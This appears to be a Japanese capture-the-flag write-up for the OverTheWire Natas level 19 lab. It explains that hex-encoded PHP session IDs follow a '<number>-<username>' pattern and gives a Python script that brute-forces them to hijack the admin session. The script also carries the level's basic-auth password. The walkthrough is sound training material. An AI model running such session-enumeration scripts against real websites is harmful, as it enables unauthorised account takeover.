![](img/natas19-1.png)  

前の問題(natas18）のphpコードと似ているが今度はセッションIDが連続ではないらしい。  

適当に"test/test"でログインしてみる。  
またURLのクエリパラメータに"debug"をつけてリクエストを行う。  

![](img/natas19-2.png)  

開発者ツールからCookieを確認してみる。  

![](img/natas19-3.png)  


PHPSESSIDが`3236352d74657374`とある。  
16進数ぽいのでdecodeを行ってみると、  

![](img/natas19-4.png)  

`3236352d74657374`が`265-test`となった。  

前回の問題ではセッションIDが1〜640だったので今回も、  
セッションIDが <1~640>-<username> という形式で作られていると予想できる。（16進に変換されて）  


前回使用したpythonコードを改変した以下のコードを使用する。  

```
import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

MAX = 640
count = 1

u="http://natas19.natas.labs.overthewire.org/index.php?debug"

while count <= MAX:
    sessionID = "PHPSESSID=" + (str(count) + "-admin").encode("utf-8").hex()
    print(sessionID)

    headers = {'Cookie': sessionID}
    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)

    count += 1

print("Done!")
```

実行してしばらく待つと、`281-admin`でflagが表示される。  

